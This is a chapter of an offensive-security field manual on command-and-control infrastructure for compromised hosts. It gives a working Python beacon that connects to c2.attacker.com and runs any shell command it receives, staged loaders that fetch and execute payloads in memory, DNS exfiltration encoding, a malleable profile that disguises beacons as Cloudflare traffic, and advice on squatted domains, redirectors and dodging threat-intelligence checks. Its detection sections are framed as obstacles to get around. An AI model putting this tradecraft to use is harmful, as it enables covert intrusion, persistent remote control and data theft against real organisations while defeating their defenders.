# Chapter 16 — Command & Control: Channels, Beacons & Profiles

**VADER-RCE Field Manual**
**Prerequisite**: Ch09 Malware Development, Ch12 Exploit Development, Ch15 Post-Exploitation
**Drill**: DRILLS/16_c2/

---

## Why You Need This

You have code execution. The implant is running. Now what?

Without C2, your exploit is a one-shot. You run a command, you get output,
then you're done. For anything beyond a point-and-click, you need a
persistent, reliable channel from your implant to your team server —
one that survives reboots, network interruptions, and detection events.

C2 is the nervous system of an operation. Every action you take on a
compromised host flows through it. The quality of your C2 infrastructure
determines the quality of your operation. Poor C2 means lost shells,
burned infrastructure, and analysts finding your pattern in network logs
within hours.

This chapter covers C2 from the architecture down to the protocol level.
How beacons work. How to build profiles that blend with legitimate traffic.
How to stage infrastructure that survives scrutiny. What defenders look
for and how to make their job harder.

The operators who last in contested environments are the ones who built
their infrastructure with the same rigour they built their exploits.

```
C2 ARCHITECTURE:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

[Team Server] ← operator console
     │
     ▼
[Listener] (HTTP/S, DNS, SMB, TCP — accepts agent callbacks)
     │
     ← network ←
     │
[Redirector] (optional proxy layer, hides team server)
     │
     ← network ←
     │
[Agent/Beacon] (running on compromised host)
     │
     ▼
[Operator commands] → agent executes → results return
```

---

## WINDOWS SETUP

This chapter involves running C2 frameworks, building C implants with kill dates, capturing network traffic, and running redirectors. Here is every tool you need and how to get it on Windows 11.

**Tools referenced in this chapter:**

| Tool | Purpose | Where to get it |
|------|---------|-----------------|
| Havoc C2 | C2 framework (recommended open-source option) | WSL2 only — see below |
| Sliver | Go-based C2 framework | WSL2 only — see below |
| Metasploit Framework | Multi-purpose exploit/C2 framework | WSL2 only — see below |
| Mythic | Modular C2 framework | WSL2 only (Docker required) |
| Wireshark | Network packet capture and analysis | Native Windows — see below |
| socat | TCP port-forwarding for redirectors | WSL2 only |
| nginx | Reverse proxy for redirectors | WSL2 only |
| gcc (MinGW-w64) | C compiler for Windows kill-date code | Native Windows — see below |
| Python 3 | Agent scripting, raw TCP examples | Native Windows |

---

### Step 1 — Install WSL2 (required for all Linux-side tools)

Open PowerShell as Administrator and run:

```powershell
wsl --install
# Installs WSL2 with Ubuntu. Requires reboot.
# After reboot, Ubuntu opens and prompts you to set a username/password.
```

**Verify WSL2 is working:**

```powershell
wsl --list --verbose
# Expected output:
#   NAME      STATE           VERSION
# * Ubuntu    Running         2
```

If VERSION shows 1 instead of 2, run: `wsl --set-version Ubuntu 2`

> **Admin rights required**: `wsl --install` must be run as Administrator.

---

### Step 2 — Install Wireshark (native Windows)

Download from: https://www.wireshark.org/download.html

Run the installer. When prompted, also install **Npcap** (the packet capture driver — required for live capture).

**Verify Wireshark works:**

```powershell
& "C:\Program Files\Wireshark\tshark.exe" --version
# Expected: TShark (Wireshark) 4.x.x ...
```

> **Admin rights required**: Npcap installation requires admin. Live capture also requires admin or being added to the `Npcap Users` group.

---

### Step 3 — Install gcc/MinGW-w64 (to compile C kill-date code on Windows)

The kill date code in Section 5 is C. You need a C compiler. On Windows, use MinGW-w64 via the MSYS2 package manager.

Download MSYS2 from: https://www.msys2.org/

After installing, open the **MSYS2 UCRT64** terminal and run:

```bash
pacman -S mingw-w64-ucrt-x86_64-gcc
```

**Verify gcc is installed:**

```bash
gcc --version
# Expected: gcc (Rev1, Built by MSYS2 project) 13.x.x ...
```

To compile C code from PowerShell, add the MinGW bin directory to your PATH:

```powershell
$env:PATH += ";C:\msys64\ucrt64\bin"
```

> **Admin rights required**: MSYS2 installation. Not required for compilation itself.

---

### Step 4 — Install C2 frameworks inside WSL2

Open your Ubuntu WSL2 terminal and run these one-time setup commands:

```bash
# Update package lists
sudo apt update && sudo apt upgrade -y

# Install build dependencies (needed for Havoc and Sliver)
sudo apt install -y git build-essential cmake python3 python3-pip mingw-w64 nasm

# Install Go (needed for Sliver and Havoc server components)
wget https://go.dev/dl/go1.22.0.linux-amd64.tar.gz
sudo tar -C /usr/local -xzf go1.22.0.linux-amd64.tar.gz
echo 'export PATH=$PATH:/usr/local/go/bin' >> ~/.bashrc
source ~/.bashrc

# Install Havoc C2
git clone https://github.com/HavocFramework/Havoc.git
cd Havoc
sudo apt install -y libssl-dev libz-dev
make
# Binary is at: Havoc/teamserver

# Install Sliver
curl https://sliver.sh/install | sudo bash
# Binary is at: /usr/local/bin/sliver-server

# Install socat (for redirectors)
sudo apt install -y socat

# Install nginx (for reverse-proxy redirectors)
sudo apt install -y nginx
```

**Verify each tool:**

```bash
# Verify Havoc compiled:
ls Havoc/teamserver
# Expected: the teamserver binary exists (no error)

# Verify Sliver:
sliver-server version
# Expected: Sliver C2 Server v1.x.x ...

# Verify socat:
socat -V
# Expected: socat by Gerhard Rieger ...

# Verify nginx:
nginx -v
# Expected: nginx version: nginx/1.x.x
```

**Verify Python (for raw TCP beacon example):**

```powershell
python --version
# Expected: Python 3.x.x
```

> **Note on Cobalt Strike**: Cobalt Strike ($5,500/yr commercial) is not covered in setup here. All drill exercises in this chapter use Havoc or Sliver instead, which are free and cover the same concepts.

---

## Section 1 — C2 Architecture

### The Four Layers

**Team Server**: your backend. This is where operator sessions live,
payloads are generated, and results are displayed. It should NEVER
be directly reachable from target environments. Its IP must not
appear in network logs on the target network.

**Listener**: a network service on the team server (or redirector) that
accepts agent callbacks. Listeners are protocol-specific. An HTTP listener
speaks HTTP. A DNS listener serves DNS responses. Multiple listeners
can run simultaneously to support multiple agent types and protocols.

**Redirector**: an optional proxy layer sitting between agents and the
team server. Agents connect to the redirector. The redirector forwards
traffic to the team server. If an agent is caught and the C2 IP is
extracted, the defender finds the redirector IP — not the team server.
The team server survives. Burn the redirector, deploy a new one.

```
REDIRECTOR CONFIGURATIONS:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

Simple socat forward:
  socat TCP-LISTEN:443,fork TCP:<team_server_ip>:443
  → Any traffic hitting redirector:443 is forwarded to team server

nginx reverse proxy:
  server {
      listen 443 ssl;
      ssl_certificate /etc/nginx/ssl/cert.pem;
      ssl_certificate_key /etc/nginx/ssl/key.pem;
      
      location /beacon {
          proxy_pass https://team-server.internal:443;
          proxy_set_header Host $host;
      }
      location / {
          # Serve decoy content for non-C2 traffic
          root /var/www/html;
          index index.html;
      }
  }
  → Legitimate-looking website for analysts, C2 only on /beacon

Domain Fronting (concept only — CDN-dependent, increasingly blocked):
  Agent connects to legitimate CDN hostname
  SNI/Host header replaced in-transit by CDN infrastructure
  Request ultimately reaches C2 via CDN edge
  Network logs show CDN IP/domain, not C2 infrastructure
```

**Agent/Beacon**: the code running on the compromised host. It periodically
connects to the listener (beacon), receives tasks, executes them, sends
back results, and sleeps until the next callback.

The agent is your presence on the target. Its capabilities, evasion,
and persistence determine what you can do and how long you last.

### Team Server → Listener → Agent Architecture (Concrete)

```
COBALT STRIKE EQUIVALENT MODEL (generalised):
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

Operator console connects to:
  Team Server:  teamserver 1.2.3.4 password [malleable_profile.c2]
                Runs on: VPS/cloud server

Listeners configured on team server:
  HTTP Listener:  https://c2.example.com:443/updates
  DNS Listener:   c2-dns.example.com (handles DNS queries as C2)
  SMB Listener:   \\.\pipe\MSSE-1234-server (peer-to-peer C2 via pipe)

Payloads (agents) generated per listener:
  Staged:     small loader (~5KB) that fetches the full agent at runtime
  Stageless:  full agent embedded in payload (~200KB+) — no stage fetch needed

Agent execution:
  1. Agent executes on target (via exploit, phishing, etc.)
  2. Agent resolves C2 hostname (DNS lookup)
  3. Agent connects to HTTPS listener
  4. Sends first-check-in (system info, operator notified)
  5. Sleeps for configured interval (30s default in CS)
  6. Wakes, sends beacon to listener
  7. If operator queued a task: receives task data
  8. Executes task (run command, inject DLL, take screenshot, etc.)
  9. Sends task results
  10. Back to sleep
```

---

## Section 2 — C2 Protocols

The protocol is how agent and server communicate. Each protocol has
different characteristics for stealth, reliability, and speed.

### HTTP/S Beacon

The most common C2 channel. Blends with normal web traffic. Port 443
(HTTPS) is almost always allowed through firewalls. TLS encryption hides
beacon content.

```
HTTP BEACON FLOW:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

Agent → Team Server (GET request = check for tasks):
  GET /updates HTTP/1.1
  Host: cdn.microsoft-delivery.com
  User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
  Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
  Cookie: MUID=A1B2C3D4...    (encoded agent session ID / task request)
  
  Response body (when no tasks): 200 OK with a benign-looking page
  Response body (when tasks queued): 200 OK with encrypted task data

Agent → Team Server (POST request = send task results):
  POST /upload HTTP/1.1
  Host: cdn.microsoft-delivery.com
  Content-Type: application/x-www-form-urlencoded
  
  data=<base64_encoded_encrypted_results>
```

**Why HTTPS matters**: without TLS, all beacon content is visible to
network inspection. With TLS, the payload is encrypted end-to-end.
The only visible indicators are: the hostname, the packet timing pattern,
and the TLS fingerprint (JA3).

### DNS C2

DNS is allowed through nearly every firewall — it's required for basic
internet access. DNS C2 tunnels command and control through DNS queries
and responses.

```
DNS C2 MECHANISM:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

SETUP:
  1. You own a domain: c2-dns.attacker.com
  2. NS record for subdomain points to your DNS server: *.beacon.c2-dns.attacker.com → YOUR_DNS_SERVER
  3. Your DNS server handles all queries for *.beacon.c2-dns.attacker.com

BEACON (check for tasks):
  Agent queries: A/TXT record for <encoded_session>.beacon.c2-dns.attacker.com
  Query encodes: agent ID + request for tasks
  Your DNS server receives the query
  Response encodes: task data (or empty if no tasks)
  
EXAMPLE QUERY:
  Agent encodes "session=A1B2C3&check_tasks=1" as base32:
  "MEQDC2LTNF3GS43UOJXW4YLCMFZWK4Y"
  Queries: MEQDC2LTNF3GS43UOJXW4YLCMFZWK4Y.beacon.c2-dns.attacker.com TXT
  
  Team server receives DNS query, decodes agent ID, checks task queue
  If task queued: encodes response in TXT record
  Response: "v=cmd:whoami" (base32 encoded, returned as TXT data)

EXFIL:
  Agent encodes command output as base32
  Splits into 63-char chunks (DNS label limit)
  Sends each chunk as a DNS query:
  CHUNK1.exfil.c2-dns.attacker.com
  CHUNK2.exfil.c2-dns.attacker.com
  DNS server reassembles and decodes
```

**DNS C2 characteristics**:
- Very slow (DNS has size limits: 253 bytes per name, 512 bytes per response)
- Excellent firewall bypass (port 53 allowed everywhere)
- Generates high DNS query volume to a single domain (detectable by UEBA)
- More complex to implement than HTTP C2
- Useful as backup channel when HTTP is blocked

**Detection**: high query rate to uncommon TLDs, long subdomain labels,
DNS queries that look like encoded data, queries to newly registered domains.

### SMB Named Pipe (Peer-to-Peer)

SMB C2 uses Windows named pipes to communicate. No external network
traffic — all communication happens inside the internal network via
the Windows file sharing protocol.

```
SMB PIPE C2 TOPOLOGY:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

[Internet] → [Internet-facing agent on DMZ host] ← HTTPS beacon
                          │
                          │ SMB pipe (internal network only)
                          │ \\DMZHOST\pipe\agent_channel
                          ▼
               [Internal host agent] ← no external traffic
               [Internal host agent] ← no external traffic
               [DC agent]            ← no external traffic

Use case: after initial compromise of a DMZ host, you pivot to
  internal hosts that have NO internet access.
  Internal agents beacon to the DMZ host via SMB pipe.
  DMZ host relays to your HTTPS listener.
  Only the DMZ host makes external connections.
```

```
# Set up SMB listener in Cobalt Strike:
Listeners → Add → SMB Beacon
Pipename: MSSE-1234-server   (mimics legitimate MSSE named pipe)

# Connect internal agent to SMB listener on another compromised host:
link \\192.168.1.50 MSSE-1234-server
# → creates SMB pipe connection from current agent to 192.168.1.50
# → 192.168.1.50's agent becomes a relay node
```

**Detection**: lateral movement via SMB pipe shows as named pipe connections
in network logs. `IPC$` connections between workstations (vs domain controllers)
are anomalous and should trigger alerts.

### Raw TCP

Direct TCP connection from agent to listener. Fast, simple, no protocol overhead.
Very detectable. Use only in environments with no network monitoring.

```python
# Minimal raw TCP agent (demonstration concept):
import socket
import subprocess
import time  # needed for time.sleep() at the bottom

while True:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # create a TCP socket
    s.connect(('c2.attacker.com', 4444))                   # connect to listener on port 4444
    cmd = s.recv(1024).decode()                            # wait for operator to send a command string
    output = subprocess.run(cmd, shell=True, capture_output=True, text=True)  # run the command in a shell
    s.send(output.stdout.encode() + output.stderr.encode())  # send stdout + stderr back to operator
    s.close()                                              # close socket until next beacon cycle
    time.sleep(30)                                         # sleep 30 seconds before reconnecting
```

### Expected Output

**Success looks like**: the listener receives an inbound TCP connection on port 4444. The operator types `whoami`, presses Enter, and sees a username returned within a second or two. Example in netcat:

```
nc -lvnp 4444
Listening on 0.0.0.0 4444
Connection received on 192.168.1.50 54321
whoami
desktop-abc\george
```

**Failure looks like `ConnectionRefusedError: [Errno 111] Connection refused`** — means nothing is listening on port 4444 on the C2 host. Start your listener first before executing the agent.

**Failure looks like no output at all after sending a command** — means `subprocess.run()` ran but returned empty stdout/stderr. The command may have produced no output, or you may have a permission error. Try `echo test` as a baseline command.

This is a Netcat shell. It works. It also triggers every modern EDR
on port 4444, direct TCP, no encryption. Don't use this in a real operation.

---

## Section 3 — Malleable C2 Profiles

A malleable C2 profile defines exactly how beacon traffic looks on
the wire. It controls: URIs, HTTP headers, sleep intervals, jitter,
cookie formats, POST data encoding — everything that determines whether
your traffic blends in or stands out.

Without a profile, Cobalt Strike (and similar) beacons generate default
traffic that is trivially detectable. Every EDR and NDR has signatures
for it. The profile is how you make your beacon look like legitimate
traffic from a known application.

### Profile Components

```
MALLEABLE C2 PROFILE STRUCTURE (Cobalt Strike syntax):
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

# Global settings:
set sleeptime "30000";           # 30 seconds between beacons (ms)
set jitter    "20";              # 20% jitter: actual sleep = 24s to 36s
set maxdns    "255";             # max DNS hostname length
set useragent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36";

# HTTP GET (beacon check-in):
http-get {
    set uri "/cdn-cgi/trace";    # Cloudflare-like endpoint (believable)
    
    client {
        header "Accept" "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8";
        header "Accept-Language" "en-US,en;q=0.5";
        header "Accept-Encoding" "gzip, deflate, br";
        header "Connection" "keep-alive";
        header "Upgrade-Insecure-Requests" "1";
        
        metadata {
            base64url;                   # encode metadata as base64url
            prepend "cf_clearance=";     # prepend Cloudflare cookie prefix
            header "Cookie";             # put it in Cookie header
        }
    }
    
    server {
        header "Content-Type" "text/plain";
        header "Cache-Control" "no-store, no-cache";
        
        output {
            base64url;
            print;               # task data is the response body
        }
    }
}

# HTTP POST (send results):
http-post {
    set uri "/cdn-cgi/beacon/expect-ct";
    
    client {
        header "Content-Type" "application/x-www-form-urlencoded";
        
        id {
            prepend "sid=";
            parameter "sid";    # session ID in URL parameter
        }
        
        output {
            base64url;
            prepend "data=";
            print;              # results in request body
        }
    }
    
    server {
        header "Content-Type" "text/plain";
        output {
            print;
        }
    }
}
```

### Sleep Jitter Mathematics

Without jitter, a beacon fires at perfectly regular intervals. Network
analysis reveals a periodic signal — every 30 seconds, a HTTPS request
to the same IP. Automated detection triggers on the pattern.

Jitter randomises the interval:

```
JITTER CALCULATION:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

Base sleep: 30000ms (30 seconds)
Jitter: 30%

Jitter range = 30000 * 0.30 = 9000ms
Random offset = random value in [-9000, +9000]
Actual sleep = 30000 + random_offset

Result: each beacon fires at 21 to 39 seconds after the previous.
No consistent interval. Harder for time-series analysis to detect.

In code (Python):
  import random
  base = 30
  jitter_pct = 30
  jitter_range = base * (jitter_pct / 100)
  actual_sleep = base + random.uniform(-jitter_range, jitter_range)
  time.sleep(actual_sleep)
```

Higher jitter = harder to detect but slower responsiveness. In highly
monitored environments, use 40-50% jitter with longer base intervals
(60s+). In tactical operations needing responsiveness, use lower jitter
with shorter intervals.

### User-Agent Rotation

Different agents pretending to be different browsers. Harder to fingerprint.

```python
# Python: rotate user-agents per beacon
import random

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 OPR/107.0.0.0",
]

headers = {'User-Agent': random.choice(USER_AGENTS)}  # pick one at random for this request
```

**The problem**: changing User-Agent per request while maintaining a
session is itself anomalous. Real browsers don't rotate User-Agents.
Better: pick ONE consistent User-Agent per agent installation. Match
the actual browser version common in the target environment.

### URI Pattern Design

URIs should match what real traffic from the application you're mimicking
looks like.

```
BAD URI DESIGN (obvious beacon):
  GET /beacon HTTP/1.1          ← the word "beacon" is in your URI
  GET /callback?id=ABC123       ← "callback" gives it away
  GET /c2/tasklist              ← don't do this

GOOD URI DESIGN (mimics real traffic):
  Mimicking Microsoft update traffic:
  GET /msdownload/update/software/secu/2024/01/windows10.0-kb5033375-x64_3a5bdc7e.msu HTTP/1.1
  
  Mimicking Google CDN traffic:
  GET /generate_204              ← Google uses this for connectivity checks
  
  Mimicking OneDrive traffic:
  GET /_api/v2.1/drives/...     ← SharePoint/OneDrive API format
  
  Mimicking Windows telemetry:
  POST /OneCollector/1.0/        ← Windows telemetry endpoint format
```

### Profile Validation

Before deployment, validate your profile against known detection tools:

```bash
# Test profile validity:
# Cobalt Strike: Cobalt Strike → Script Manager → load profile
# Check for syntax errors

# Validate against C2 analysers:
# https://github.com/fox-it/cobaltstrike-beacon-detector
# https://github.com/0xjxd/cobaltstrike-profile-checker

# Check TLS fingerprint:
# JA3: https://github.com/salesforce/ja3
# Capture beacon traffic, extract JA3 hash, check against known-C2 databases

# Profile resources (publicly available, battle-tested):
# https://github.com/rsmudge/Malleable-C2-Profiles
# Choose one matching your target environment's traffic baseline
```

---

## Section 4 — Staged vs Stageless Implants

Every implant design decision involves a tradeoff between stealth,
reliability, and capability.

### Staged Implants

A staged implant is a two-part delivery:

1. **Stage 0** (small loader): delivered via exploit or phishing. Only job:
   connect to C2, download the full agent, execute it in memory.
2. **Stage 1** (full agent): the actual implant with all capabilities.
   Served by the C2 listener only when the stager calls in.

```
STAGED DELIVERY FLOW:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

1. Exploit delivers Stage 0 (shellcode, ~5KB):
   buf = VirtualAlloc(RWX)
   ReadFile(stage0.bin, buf)
   CreateThread(buf)          ← Stage 0 executes

2. Stage 0 runs:
   SOCKET s = connect(c2_host, 443)
   stage1_bytes = recv(s, sizeof_stage1)  ← downloads full agent
   exec_buf = VirtualAlloc(RWX)
   memcpy(exec_buf, stage1_bytes, size)
   CreateThread(exec_buf)     ← Stage 1 executes

3. Stage 1 runs:
   Full beacon capabilities: inject, screenshot, lateral movement, etc.

ADVANTAGES:
  - Small initial payload (harder to detect, fewer bytes in exploit)
  - Full agent never touches disk
  - Can update the Stage 1 without re-exploiting

DISADVANTAGES:
  - Requires network connectivity at stager execution time
  - Two-stage traffic is itself a detection indicator
  - Stage 0 must request from C2 — if C2 is down, delivery fails
```

### Stageless Implants

The full agent is embedded directly in the payload. One delivery, one execution.

```
STAGELESS DELIVERY:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

Exploit delivers full agent in one shot (~100-500KB depending on agent)
Agent self-injects into memory, begins beaconing immediately
No second network request to fetch additional code

ADVANTAGES:
  - No stage fetch required — works even if C2 temporarily unreachable
  - Single network request pattern (no staging traffic to detect)
  - More reliable initial execution

DISADVANTAGES:
  - Larger initial payload (more bytes in exploit, harder to deliver via
    some exploit primitives)
  - Full agent capabilities visible in initial payload
  - If payload file is analysed, full agent code is available to defenders

WHEN TO USE WHICH:
  Staged:    when initial delivery vector has size limits (exploit shellcode limit)
             when stealth of initial payload matters more than reliability
  Stageless: when reliable initial execution matters (phishing)
              when C2 availability at delivery time can't be guaranteed
```

---

## Section 5 — C2 OPSEC

Getting the shell is 20% of the operation. Keeping it without burning
your infrastructure is the other 80%.

### Redirectors

Every implant should communicate with a redirector, not the team server.

```
REDIRECTOR LIFECYCLE:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

1. Spin up cheap VPS ($5/mo, disposable):
   AWS Lightsail, DigitalOcean Droplet, Vultr

2. Configure socat/nginx forward to team server

3. Configure implants to use redirector hostname

4. If redirector IP is burned:
   - Terminate VPS instance
   - Spin up new VPS with new IP
   - Update DNS to point domain at new IP
   - New implants deploy automatically (resolve same hostname, new IP)
   - Old implants already in memory lose their connection (acceptable loss)

NEVER: let implants connect directly to team server IP
NEVER: let team server IP appear in network logs on target
```

### Domain Categorisation

Defenders check C2 domains against web categorisation services
(Symantec WebPulse, Palo Alto URL Filtering, Cisco Talos).
Uncategorised domains trigger alerts. Domains in "malware" or "phishing"
categories are blocked.

```
DOMAIN SELECTION CRITERIA:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

1. Age: register domain >2 weeks before use
   → Newly registered domains (< 7 days) are high-risk indicators
   → Check: whois <domain> → registration date

2. Pre-categorise: before the operation, get the domain categorised
   → Submit to URL categorisation services as "Technology" or "Business"
   → Use the domain to serve actual content for a few weeks first

3. Check before use:
   curl -s "https://sitereview.bluecoat.com/v#/lookup-result/<domain>"
   curl -s "https://talosintelligence.com/reputation_center/lookup?search=<domain>"
   # Domain must have a category OTHER than "Uncategorized" or "Suspicious"

4. Avoid suspicious TLDs:
   .tk, .ml, .ga, .cf, .gq (free Freenom domains) → automatic high-risk
   .xyz, .info, .biz, .cc → moderate-risk
   .com, .net, .org, .io → lower suspicion

5. Consider squatting on legitimate-seeming names:
   cdn-delivery-network.com      (CDN theme)
   microsoft-update-svc.com      (Windows update theme — risky, potentially actionable)
   cloudflare-analytics.com      (CDN/analytics theme)
   # Note: impersonating specific companies has legal implications
```

### Kill Dates

Include a kill date in your implant. After a certain date, the implant
terminates and never calls home again. This prevents old implants from
being used after an operation ends or being caught years later and
traced back to you.

**Compiler note**: This code uses the Windows API function `ExitProcess()` from
`kernel32.dll`, and standard C time functions from the C runtime library.
You must link against both when compiling.

**Compile command (MinGW-w64 on Windows via MSYS2 UCRT64 terminal):**

```bash
# Compile the kill-date implant stub:
# -o kill_stub.exe   → output executable name
# kill_stub.c        → your source file
# -lkernel32         → link kernel32.dll (provides ExitProcess, Windows API)
# No special flags needed for time.h — it's part of the C standard library
gcc -o kill_stub.exe kill_stub.c -lkernel32

# If you want a 64-bit Windows executable (recommended):
x86_64-w64-mingw32-gcc -o kill_stub.exe kill_stub.c -lkernel32
```

```c
// kill_stub.c — Kill date check in implant
// Compiler: gcc (MinGW-w64) on Windows, or x86_64-w64-mingw32-gcc in WSL2
// Link: -lkernel32 (for ExitProcess)

#include <time.h>     // provides: time(), time_t, struct tm, mktime()
#include <windows.h>  // provides: ExitProcess() from kernel32.dll

void check_kill_date() {
    time_t now = time(NULL);   // get current UTC time as seconds since epoch
    struct tm kill_date = {0}; // zero-initialise the struct (all fields = 0)
    
    kill_date.tm_year = 124;   // years since 1900: 1900 + 124 = 2024
    kill_date.tm_mon  = 11;    // month index 0-11: 11 = December
    kill_date.tm_mday = 31;    // day of month: 31st
    
    time_t kill_time = mktime(&kill_date); // convert struct tm to epoch seconds
    
    if (now > kill_time) {
        // Current time is past the kill date — terminate silently
        // ExitProcess(0) is from kernel32.dll — link with -lkernel32
        // exit code 0 looks like a clean normal exit to the OS
        ExitProcess(0);
    }
}

// Call this at the start of every beacon loop:
// int main() {
//     while (1) {
//         check_kill_date();   // die silently if past kill date
//         // ... beacon logic here ...
//     }
// }
```

### Expected Output

**Success looks like**: the binary compiles with no output (gcc is silent on success):

```
$ gcc -o kill_stub.exe kill_stub.c -lkernel32
$
```

Run it before the kill date — it exits normally (code 0, no output). Change `tm_year` to a past year (e.g., `100` for year 2000), recompile, run — it exits immediately with no output. That's the correct kill-date behaviour.

**Failure looks like `kill_stub.c:3:10: fatal error: windows.h: No such file or directory`** — means you are not using the MinGW-w64 compiler. Plain Linux gcc does not have Windows headers. Fix: use `x86_64-w64-mingw32-gcc` instead of `gcc`, or install MinGW-w64 via MSYS2.

**Failure looks like `undefined reference to 'ExitProcess'`** — means you forgot `-lkernel32` in your compile command. `ExitProcess` lives in `kernel32.dll` and the linker needs to be told to link it.

**Failure looks like `undefined reference to 'mktime'` or `time`** — rare with MinGW, but if it happens, add `-lmsvcrt` to your compile flags. This links the Microsoft C runtime which provides the standard C time functions.

### Domain Fronting (Conceptual)

Domain fronting routes traffic through a CDN such that the SNI (Server
Name Indication) in the TLS handshake and the HTTP Host header differ.
Network monitoring sees the CDN's trusted domain. The request ultimately
reaches the C2 via the CDN.

```
DOMAIN FRONTING CONCEPT:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

Agent connects to: legitimate.cdn.com:443 (SNI in TLS)
HTTP Host header:  c2.attacker.com        (actual destination in HTTP layer)
CDN routes based on Host header to: c2.attacker.com
(c2.attacker.com is also hosted on the same CDN)

Network inspection sees: connection to legitimate.cdn.com
Never sees: c2.attacker.com

STATUS (2024): Most major CDNs (AWS CloudFront, Google Cloud CDN, Azure CDN)
have patched this by enforcing SNI/Host consistency. Fronting via major CDNs
largely deprecated. Some smaller CDNs still vulnerable. Research current state
before building a dependency on this technique.
```

---

## Section 6 — C2 Detection Methods

Know what the defenders are looking for. Build your C2 to not look like that.

### JA3 / JA3S Fingerprinting

JA3 is an algorithm that fingerprints TLS clients (and servers) based
on TLS handshake parameters. Every TLS library has a distinct JA3 hash.
Many C2 frameworks have known JA3 hashes.

```
JA3 CALCULATION (simplified):
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

JA3 hashes: TLSVersion,Ciphers,Extensions,EllipticCurves,EllipticCurvePointFormats
Example: 769,47-53-5-10-49161-49162-49171-49172-50-56-19-4,0-10-11,23-24-25,0
MD5 of that string = JA3 hash

KNOWN MALICIOUS JA3 HASHES (partial list):
  a0e9f5d64349fb13191bc781f81f42e1  → Metasploit Meterpreter
  72a589da586844d7f0818ce684948eea  → Cobalt Strike default
  b386946a5a44d1ddcc843bc75336dfce  → Cobalt Strike malleable profile (some)

DEFENDERS USE JA3 TO:
  - Block connections from known-bad TLS fingerprints at the firewall
  - Alert on matching fingerprints in network traffic
  - Attribute traffic to specific tooling

YOUR RESPONSE:
  1. Use a realistic JA3 — compile your agent using the same TLS library
     as the software you're mimicking (Chrome uses BoringSSL → match its JA3)
  2. Or: use a framework that supports JA3 randomisation
  3. Check your JA3 before deployment:
     # Capture traffic: Wireshark → capture → filter tls.handshake.type == 1
     # Extract JA3: https://github.com/salesforce/ja3
     python ja3.py capture.pcap
     # Compare against known-good browser JA3 hashes
```

### Beacon Interval Analysis

Regular beacon intervals are detectable by UEBA and SIEM tools that
perform time-series analysis on connection patterns.

```
DETECTION LOGIC:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

SIEM looks for:
  - Same source IP making requests to same destination at regular intervals
  - Requests with low entropy in timing (consistent ± small variation)
  - Short sessions (connect, small request, disconnect, wait, repeat)
  - Connections outside business hours to external IPs

AUTOMATED BEACON DETECTION TOOLS:
  - Zeek C2 detection scripts
  - Security Onion's beacon detection
  - Elastic SIEM ML detection rules
  - Darktrace behavioural AI

COUNTERMEASURES:
  - High jitter (30-50%) breaks simple interval matching
  - Vary request sizes (add random padding to POST data)
  - Randomise URIs (rotate through a pool of valid-looking URIs)
  - Use long sleep times (60s+ base) — fewer samples for analysis
  - Masquerade traffic timing after business hours ends
    (if target org is 9-5, beacon at 23:00 is suspicious)
```

### Network IOC Hunting

Defenders feed known C2 infrastructure to threat intel feeds and
hunt for these across network logs.

```bash
# Defender hunts:
# Proxy logs → match against ThreatFox/Abuse.ch C2 domains
# DNS logs → match against malware C2 domain feeds
# NetFlow → match against C2 IP reputation feeds

# Your OPSEC response:
# 1. Use fresh infrastructure for each operation
# 2. Check all C2 IPs/domains against major threat intel BEFORE use:
curl -s "https://api.abuseipdb.com/api/v2/check?ipAddress=<YOUR_IP>&maxAgeInDays=90" \
     -H "Key: <API_KEY>"

# Check domain:
curl -s "https://urlhaus-api.abuse.ch/v1/host/" \
     -d "host=<YOUR_DOMAIN>"

# VirusTotal IP check:
curl -s "https://www.virustotal.com/api/v3/ip_addresses/<IP>" \
     -H "x-apikey: <API_KEY>"

# If any of these return hits: do NOT use this infrastructure.
# Burn it. Get new IPs. Get new domains. Never operate on flagged infrastructure.
